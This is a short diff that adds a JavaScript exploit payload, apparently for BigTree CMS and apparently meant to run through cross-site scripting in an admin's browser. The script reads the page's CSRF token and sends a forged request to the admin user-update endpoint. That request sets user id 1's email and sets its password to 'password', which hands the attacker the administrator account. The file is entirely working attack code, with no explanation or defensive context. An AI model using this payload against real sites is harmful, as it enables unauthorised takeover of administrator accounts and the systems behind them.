@@ -1,0 +1,12 @@
+var host = document.location.host;
+var req = new XMLHttpRequest();
+var tokename = encodeURIComponent(CSRFTokenField);
+var token = encodeURIComponent(CSRFToken);
+var payload = "&id=1&email=lol@get.hec&password=password";
+var exploit = tokename + "=" + token + payload;
+req.open("POST", "http://" + host + "/bigtree/site/index.php/admin/users/update/", true);
+req.setRequestHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", true);
+req.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", true);
+req.setRequestHeader("Accept-Language", "en-US,en;q=0.5", true);
+req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded", true);
+req.send(exploit);
